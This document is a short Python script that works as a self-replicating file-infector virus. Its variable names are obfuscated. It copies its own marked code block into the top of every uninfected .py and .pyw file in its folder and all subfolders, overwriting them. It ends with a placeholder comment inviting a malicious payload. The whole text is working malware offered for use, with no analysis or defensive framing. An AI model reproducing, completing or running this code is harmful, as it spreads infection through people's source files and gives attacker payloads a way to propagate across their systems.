### START ###
import sys
import glob
import os
_v0 = []
with open(sys.argv[0], 'rb') as _v1:
    _v2 = _v1.readlines()
_v3 = False
for _v4 in _v2:
    if _v4 == b'### START ###\r\n':
        _v3 = True
    if _v3:
        _v0.append(_v4)
    if _v4 == b'### END ###\r\n':
        break
_v5 = os.path.realpath(__file__)
_v5 = _v5.split('\\')
_v5.pop()
_v6 = ""
for _v7 in _v5:
    _v6 += _v7 + "\\"
_v6 = _v6[:-1]
_v8 = os.walk(_v6)
_v8 = list(_v8)
_v9 = []
for _vA in range(0, len(_v8)):
    _v9.append(
        _v8[_vA][0][len(_v6) + 1:])
_vB = []
_vB += glob.glob('*.py') + glob.glob('*.pyw')
for _vC in _v9:
    _vB += glob.glob(f'{_vC}/*.py') + glob.glob(f'{_vC}/*.pyw')
for _vD in _vB:
    with open(_vD, 'rb') as _vE:
        _vF = _vE.readlines()
    if b'### START ###\r\n' in _vF:
        continue
    _v10 = []
    _v10 += _v0
    _v10 += list(_vF)
    with open(_vD, 'wb') as _v11:
        _v11.writelines(_v10)
# ENTER VIRUS CODE HERE!!!#
### END ###
